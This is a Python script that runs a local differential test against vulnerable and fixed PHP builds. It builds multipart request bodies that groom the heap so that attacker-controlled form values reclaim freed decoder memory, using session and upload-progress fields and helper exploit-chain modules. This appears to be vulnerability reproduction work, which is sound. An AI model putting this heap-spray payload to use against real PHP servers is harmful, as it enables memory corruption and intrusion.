#!/usr/bin/env python3
"""Local differential test with a form value reclaiming freed decoder memory."""

from __future__ import annotations

import argparse
import hashlib
import os
from pathlib import Path

import chain_unserialize as chain
import repro


def controlled_consumer(fill: bytes) -> bytes:
    if len(fill) != 1:
        raise ValueError("fill must be one byte")
    body = bytearray(repro.field(b"PHPSESSID", chain.SID_B))
    for index in range(700):
        if index == 568:
            for item in range(113):
                value = f"V{item:04d}".encode().ljust(295, fill)
                body += repro.field(f"s{item:04d}".encode(), value)
        body += chain.empty_file(index)
    for index in range(50):
        body += repro.field(f"b{index:04d}".encode(), b"B" * 8200)
    body += repro.field(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    body += chain.tail_file()
    body += chain.END
    if len(body) >= 1_048_576:
        raise RuntimeError("consumer exceeds one MiB")
    return bytes(body)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--php-vulnerable", type=Path)
    parser.add_argument("--php-fixed", type=Path)
    args = parser.parse_args()
    vulnerable = args.php_vulnerable.resolve(strict=True) if args.php_vulnerable else None
    fixed = args.php_fixed.resolve(strict=True) if args.php_fixed else None
    # The CLI server inherits its working directory, which affects heap layout.
    os.chdir(Path(__file__).resolve().parent)
    shared = {"early-a": chain.early(chain.SID_A, b"A"),
              "early-b": chain.early(chain.SID_B, b"B"), "late": chain.late()}
    y = controlled_consumer(b"Y")
    z = controlled_consumer(b"Z")
    for label, body in (("Y", y), ("Z", z)):
        print(f"consumer-{label}: {len(body)} bytes, sha256={hashlib.sha256(body).hexdigest()}")
    if vulnerable:
        repro.run_one("vulnerable control", vulnerable, {"consumer": y}, ("consumer",))
        chain.run("vulnerable Y", vulnerable, {**shared, "consumer": y})
        chain.run("vulnerable Z", vulnerable, {**shared, "consumer": z})
    if fixed:
        chain.run("fixed Y", fixed, {**shared, "consumer": y})


if __name__ == "__main__":
    main()
